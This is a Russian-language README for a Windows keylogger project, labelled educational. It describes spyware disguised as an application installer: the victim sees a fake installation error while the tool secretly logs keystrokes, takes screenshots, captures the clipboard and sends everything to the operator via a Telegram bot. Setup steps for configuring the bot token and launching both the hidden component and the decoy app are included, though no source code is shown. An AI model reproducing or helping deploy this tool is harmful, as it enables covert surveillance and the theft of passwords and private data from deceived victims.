# Windows Keylogger

> **ВНИМАНИЕ: УЧЕБНЫЙ ПРОЕКТ**  
> Данный проект создан исключительно в образовательных целях для изучения принципов работы системного ПО.  

## Описание

Кейлоггер для Windows, который маскируется под установщик приложения. При запуске установщика пользователь видит окно ошибки установки, в это время в фоновом режиме устанавливается система мониторинга.
<img width="986" height="598" alt="image" src="https://github.com/user-attachments/assets/9b08c974-5815-4e2c-8263-066cb4433b6a" />

### Функциональность

- **Кейлоггинг** - запись всех нажатых клавиш с определением раскладки
- **Скриншоты** - автоматическое создание снимков экрана:
  - По расписанию (настраиваемый интервал)
  - При смене активного окна
- **Мониторинг буфера обмена** - перехват текста и изображений
- **Автоотправка данных** - автоматическая отправка логов и медиафайлов через Telegram бота

## Установка и настройка

1. **Создание Telegram бота:**
   ```bash
   - Найти @BotFather в Telegram
   - Команда: /newbot
   - Получить токен бота
   - Узнать ваш chat_id через @userinfobot
   ```
   
2. **Клонирование репозитория**
    ``` bash
    git clone <url-репозитория>

    # Переход в директорию проекта
    cd keylogger
   ```
   
3. **Установка зависимостей**
    ```bash
   pip install -r requirements.txt
   ```

4. **Создание файла конфигурации**

    ```bash
    # Создаем новый .env файл
    notepad .env
    ```
   
    Содержимое .env файла:
    
    ```bash
    BOT_TOKEN=your_telegram_bot_token_here
    CHAT_ID=your_telegram_chat_id_here
    ```
   
5. **Запуск**

    ```bash
    python main.pyw
   
   # Основное приложение (маскировка):
   python app.py
    ```
